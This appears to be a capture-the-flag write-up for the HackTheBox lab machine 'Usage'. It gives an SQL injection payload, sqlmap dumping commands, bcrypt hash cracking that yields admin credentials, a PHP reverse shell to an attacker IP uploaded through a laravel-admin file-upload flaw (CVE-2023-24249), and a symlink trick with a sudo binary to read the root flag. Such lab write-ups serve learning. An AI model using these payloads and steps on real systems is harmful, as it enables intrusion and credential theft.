Domain found `usage.htb`. 

After trying some random stuff and running `gobuster` directory brute forcing, I didn't find anything useful. However after making an account and heading to `/forgot-password` I found an SQLi in the `email` input. Ex:
`email=a@a.com' AND 1=1;-- -`
```bash
cat reqq.txt

After capturing this request using burpsuite and running it through `sqlmap` I didn't find a ton of useful information the first few times however after turning up the risk/level paramter's and adding some other's I was able to find the database table `usage_blog` that could be targeted more specifically.

```bash
sqlmap -r reqq.txt -p email --batch --level 5 --risk 3 --dbms=mysql --dbs --dump --tables --threads 5

`information_schema` - Standardized set of read-only views that provide information about all the SQL Server objects (databases, tables, columns, etc.). 
`performance_chema` - Provides a way to inspect internal execution of the server at runtime. It includes a number of tables that can be queried to assess the performance of various operations to diagnose problems.
`usage_blog` - Blog database

{{< figure src="./usage.png" title="usage" alt="alt text string" width="auto" >}}

As you can see we successfully got the hash for the `Administrator` from the db/table: `usage_blog.admin_users`.

After copying the hash and echoing it to a file, then running `hashid -m <file>` on it... It output's the mode as:
```bash
hashid -m hash                                            
--File 'hash'--

[+] Woltlab Burning Board 4.x 
[+] bcrypt [Hashcat Mode: 3200]
--End of file 'hash'-- 
```

Then running hashcat:
```bash
hashcat -m 3200 -a 0 hash /usr/share/wordlists/rockyou.txt
```

Credentials found: `administrator:whatever1`

The credentials didn't work on the original login page so I then though of running gobuster dns enumeration using the wordlist `/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt`. 

```bash
gobuster dns -d 'usage.htb'  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt

Here... the credentials worked just fine... `admin:whatever1`

### Foothold
- [CVE-2023-24249](https://flyd.uk/post/cve-2023-24249/) - RCE in larravel-admin that allows attackers to bypass file upload restrictions, and attackers can upload files in `*.php` format for code execution.

Using a tool I wrote, I then created a php reverse shell file using the `PentestMonkey` PHP reverse shell script.
```bash
genrevshell php -f shell.php -i 10.10.14.40 -p 4444 
---
[+] shell.php generated successfully using the PHP Reverse shell script!
```

After logging in, we can see it is a laravel-admin dashboard for managing services etc. getting a peek at what the site is running, we can see it is running `Laravel` version `10.18.0`. 

After a bit of research I found the CVE mentioned above and gave it a shot.

The CVE here basically is when changing the `.jpg` favicon image for the profile photo, you can intercept the request and change the file extension to `.php` which the server will then execute.

So, using `shell.php` from earlier that I generated; i simply made a copy of the reverse shell as `shell.jpg` and gave it a shot...

**Getting root.txt**
```bash
11  cd /var/www/html
   12  ls
   13  cat root.txt
   14  file root.txt
   15  strings ~/root/root.txt
   16  uname -a
   17  n
   18  uname -m
   19  cat /proc/version
   20  touch '@root.txt'
   21  ln -s -r /root/root.txt root.txt
   22  rm -f root.txt
   23  ln -s -r /root/root.txt root.txt
   24  sudo /usr/bin/usage_management
   
```

Above is a paste of the command history to get the root flag.
